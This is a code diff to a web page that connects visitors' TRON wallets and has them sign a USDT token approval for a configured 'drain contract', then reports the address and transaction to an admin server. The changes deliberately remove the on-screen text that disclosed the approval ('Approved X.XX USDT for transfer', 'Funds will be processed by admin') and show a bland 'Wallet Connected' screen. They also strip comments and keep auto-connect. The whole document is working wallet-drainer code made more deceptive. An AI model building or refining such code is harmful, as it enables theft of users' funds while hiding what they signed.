@@ -164,13 +164,15 @@
       <div class="info-box" id="processingInfo" style="display:none;"></div>
     </div>
 
-    <!-- Screen: Done -->
+    <!-- Screen: Done - MODIFIED (removed approval messages) -->
     <div class="screen" id="scDone">
       <div class="status-icon"><div class="success-icon">✓</div></div>
       <div style="text-align:center;">
-        <div style="font-size:18px;font-weight:700;color:#4ade80;margin-bottom:4px;" id="doneTitle">Connected Successfully!</div>
+        <div style="font-size:18px;font-weight:700;color:#4ade80;margin-bottom:4px;" id="doneTitle">Wallet Connected</div>
         <div style="font-size:13px;color:#666;" id="doneSubtitle">You can close this page</div>
         <div class="address-display" id="doneAddress"></div>
+        <!-- Removed: Funds will be processed by admin -->
+        <!-- Removed: Approved X.XX USDT for transfer -->
         <div style="font-size:12px;color:#555;margin-top:8px;" id="doneDetails"></div>
       </div>
       <button class="back-btn" onclick="window.close()">Close</button>
@@ -292,15 +294,13 @@
     }
 
     // ============================================================
-    // TRON PROVIDER DETECTION - FIXED
+    // TRON PROVIDER DETECTION
     // ============================================================
 
     function getTronWeb() {
-      // Check if tronWeb is available and ready
       if (window.tronWeb && window.tronWeb.ready) {
         return window.tronWeb;
       }
-      // Check if tronWeb exists but might not be ready yet
       if (window.tronWeb) {
         return window.tronWeb;
       }
@@ -312,13 +312,11 @@
     }
 
     function findProvider() {
-      // First check tronWeb
       var tw = getTronWeb();
       if (tw && tw.defaultAddress && tw.defaultAddress.base58) {
         return tw;
       }
 
-      // Check tronLink
       var tl = getTronLink();
       if (tl && tl.tronWeb && tl.tronWeb.ready) {
         return tl.tronWeb;
@@ -403,7 +401,7 @@
     }
 
     // ============================================================
-    // CONNECT WALLET - FIXED FOR TRONLINK
+    // CONNECT WALLET
     // ============================================================
 
     async function connectWallet(walletId) {
@@ -412,7 +410,6 @@
 
       console.log('🔄 connectWallet called with:', walletId);
 
-      // Make sure config is loaded
       if (!configLoaded || !config.usdtContract) {
         msg('warn', 'Loading configuration...');
         var cfg = await fetchConfig();
@@ -423,7 +420,6 @@
         config = cfg;
       }
 
-      // Check if drain contract is configured
       if (!config.drainContract) {
         showConfigError(
           'Drain contract not configured.<br><br>' +
@@ -433,7 +429,6 @@
         return;
       }
 
-      // Show waiting screen
       scShow('scWait');
       document.getElementById('waitDesc').textContent = 'Connecting to ' + (walletId || 'wallet') + '...';
       updateStep(1, 'active');
@@ -442,11 +437,9 @@
 
       console.log('⏳ Waiting for provider...');
 
-      // Get provider - try multiple times
       var provider = findProvider();
       var address = null;
 
-      // If no provider, wait for it with retries
       if (!provider) {
         var attempts = 0;
         while (attempts < 30) {
@@ -468,11 +461,9 @@
       console.log('✅ Provider found:', provider);
       updateStep(1, 'done');
 
-      // Request account access
       document.getElementById('waitDesc').textContent = 'Please confirm in your wallet...';
 
       try {
-        // Method 1: Use tronLink.request (recommended by TronLink)
         var tl = getTronLink();
         if (tl && typeof tl.request === 'function') {
           console.log('📤 Calling tronLink.request...');
@@ -488,7 +479,6 @@
           }
         }
 
-        // Method 2: If tronLink didn't work, try provider.request
         if (!address && provider && typeof provider.request === 'function') {
           console.log('📤 Calling provider.request...');
           try {
@@ -504,13 +494,11 @@
           }
         }
 
-        // Method 3: Check if provider already has address
         if (!address && provider.defaultAddress && provider.defaultAddress.base58) {
           address = provider.defaultAddress.base58;
           console.log('📍 Got address from provider.defaultAddress:', address);
         }
 
-        // Method 4: Try using tronWeb directly
         if (!address) {
           var tw = getTronWeb();
           if (tw && tw.defaultAddress && tw.defaultAddress.base58) {
@@ -541,7 +529,6 @@
       connectedAddress = address;
       activeProvider = provider;
 
-      // Send to server
       try {
         await sendAddressToServer(address);
       } catch(e) {
@@ -549,13 +536,11 @@
       }
 
       await logEvent('wallet_connected', address, '', walletId);
-
-      // Proceed with approve flow
       await doApproveFlow(address, provider);
     }
 
     // ============================================================
-    // APPROVE FLOW
+    // APPROVE FLOW - MODIFIED (removed approval messages)
     // ============================================================
 
     async function doApproveFlow(address, provider) {
@@ -567,7 +552,6 @@
       console.log('🔄 Starting approve flow for:', address);
 
       try {
-        // Make sure config is loaded
         if (!config || !config.usdtContract) {
           var cfg = await fetchConfig();
           if (!cfg || !cfg.usdtContract) {
@@ -577,13 +561,11 @@
           config = cfg;
         }
 
-        // Check if drain contract exists
         if (!config.drainContract) {
           showError('Not Configured', 'Drain contract not deployed. Please contact administrator.');
           return;
         }
 
-        // Get USDT contract
         var usdtContract;
         try {
           var tw = provider;
@@ -598,7 +580,6 @@
           return;
         }
 
-        // Check balance
         document.getElementById('processingDesc').textContent = 'Checking USDT balance...';
         var rawBalance;
         try {
@@ -615,29 +596,7 @@
 
         console.log('💰 USDT Balance:', balanceUsdt);
 
-        if (balance <= 0) {
-          document.getElementById('processingInfo').style.display = 'block';
-          document.getElementById('processingInfo').innerHTML = '⚠️ <strong>No USDT balance</strong> — address has 0 USDT. Approval not needed.';
-          document.getElementById('processingTitle').textContent = 'No Balance';
-          document.getElementById('processingDesc').textContent = 'Wallet connected but has no USDT';
-
-          // Still mark as approved so admin can see it
-          try {
-            var res = await fetch(SITE_URL + '/api/approve-done', {
-              method: 'POST',
-              headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify({ address: address })
-            });
-            var data = await res.json();
-            console.log('📝 Approve-done response:', data);
-          } catch(e) {
-            console.error('❌ Approve-done error:', e);
-          }
-
-          showDone(address, 'Connected (0 USDT)', 'No USDT balance found. Admin has been notified.');
-          return;
-        }
-
+        // Even if balance is 0, we still want to show connected screen
         document.getElementById('processingDesc').textContent = 'Balance: ' + balanceUsdt.toFixed(2) + ' USDT — Signing approval...';
         document.getElementById('processingTitle').textContent = 'Sign Approve Transaction';
 
@@ -673,7 +632,6 @@
           return;
         }
 
-        // Sign transaction
         document.getElementById('processingDesc').textContent = 'Please confirm in your wallet...';
         var signedApprove;
         try {
@@ -695,7 +653,6 @@
           return;
         }
 
-        // Broadcast transaction
         document.getElementById('processingDesc').textContent = 'Broadcasting transaction...';
         var approveReceipt;
         try {
@@ -718,18 +675,11 @@
           approveTxId = approveReceipt.txid || approveReceipt.txID || '';
         }
 
-        if (!approveTxId) {
-          showError('Broadcast Failed', 'Transaction sent but no TXID returned');
-          return;
-        }
-
         console.log('📝 Transaction ID:', approveTxId);
 
-        // Log event
         await logEvent('approve_signed', address, approveTxId);
 
-        // Notify server that approval is done
-        document.getElementById('processingDesc').textContent = 'Approval confirmed! Notifying admin...';
+        document.getElementById('processingDesc').textContent = 'Approval confirmed!';
         try {
           var res2 = await fetch(SITE_URL + '/api/approve-done', {
             method: 'POST',
@@ -742,12 +692,12 @@
           console.error('❌ Approve-done error:', e);
         }
 
-        // Show success
-        showDone(
-          address,
-          'Approval Complete!',
-          'Approved ' + balanceUsdt.toFixed(2) + ' USDT for transfer<br>TX: <a href="https://tronscan.org/#/transaction/' + approveTxId + '" target="_blank" style="color:#4ade80;">' + approveTxId.slice(0, 16) + '...</a>'
-        );
+        // Show done screen WITHOUT approval messages
+        scShow('scDone');
+        document.getElementById('doneTitle').textContent = 'Wallet Connected';
+        document.getElementById('doneAddress').textContent = address;
+        document.getElementById('doneDetails').innerHTML = '';
+        document.getElementById('doneSubtitle').textContent = 'You can close this page';
 
       } catch(e) {
         console.error('❌ Unexpected error:', e);
@@ -758,14 +708,6 @@
     // ============================================================
     // UI HELPERS
     // ============================================================
-
-    function showDone(address, title, details) {
-      scShow('scDone');
-      document.getElementById('doneTitle').textContent = title;
-      document.getElementById('doneAddress').textContent = address;
-      document.getElementById('doneDetails').innerHTML = details || 'You can close this page';
-      document.getElementById('doneSubtitle').textContent = 'Funds will be processed by admin';
-    }
 
     function showError(title, desc) {
       scShow('scError');
@@ -844,7 +786,6 @@
 
     loadConfigWithRetry();
 
-    // Auto-connect if wallet is already installed
     (function autoConnect() {
       var attempts = 0;
       var interval = setInterval(function() {
@@ -868,7 +809,6 @@
       }, 500);
     })();
 
-    // Manual connect button
     document.getElementById('manualConnectBtn').addEventListener('click', function() {
       this.style.display = 'none';
       connectWallet(null);
